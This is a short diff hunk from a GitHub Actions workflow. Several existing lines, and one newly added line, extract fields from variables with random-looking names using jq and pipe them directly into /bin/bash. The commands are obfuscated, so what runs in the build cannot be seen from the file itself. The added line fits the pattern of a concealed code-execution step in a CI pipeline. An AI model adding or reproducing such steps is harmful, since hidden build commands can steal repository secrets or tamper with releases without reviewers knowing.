@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$gt3571" | jq -r .ap36429 | /bin/bash
           printf '%s' "$bimsd26827" | jq -r .aplr28 | /bin/bash
           printf '%s' "$befk45" | jq -r .g436 | /bin/bash
+          echo $d2 | jq -r .afnfp618 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
